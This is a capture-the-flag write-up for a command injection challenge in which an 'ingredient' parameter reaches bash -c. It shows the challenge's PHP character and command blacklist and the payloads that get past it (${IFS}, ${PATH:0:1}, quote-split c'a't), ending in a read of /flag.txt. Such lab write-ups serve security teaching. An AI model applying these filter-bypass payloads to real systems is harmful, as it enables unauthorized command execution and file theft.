# Solution

A line in the description, `bash -c 'recipe'`, hints that user-input (ingredient= parameter) is being passed into `bash -c ''`.  
Trying the payload `;ls` will reveal command injection. 

However, reading the flag will require bypassing the below blacklist:
```php
$blacklistCharacters = ['&', '|', '`', '>', '<', '(', ')', '[', ']', '\\', '"', '*', '/', ' '];
$blacklistCommands = ['rm', 'mv', 'cp', 'cat', 'echo', 'touch', 'chmod', 'chown', 'kill', 'ps', 'top', 'find'];
```

Utilizing any blacklisted characters will result in 'Illegal character detected' and likewise will use of blacklisted commands result in 'Illegal command detected'.
This allows an attacker to enumerate allowed special characters through either manual means or a tool like Burp Intruder.
Eventually, this should lead attackers to research ``bypassing bash restrictions`` which could lead to, for instance, this resource: https://www.verylazytech.com/linux/bypassing-bash-restrictions-rbash.

This outlines a bunch of bypasses that work for this challenge.

An example solution:

Bypassing spaces = ${IFS}
Bypassing / = ${PATH:0:1}
Bypassing cat = c'a't

asd;ls -> reveals index.php
asd;c'a't${IFS}index.php -> reveals flag is at /flag.txt
asd;c'a't${IFS}${PATH:0:1}flag.txt -> reads flag.
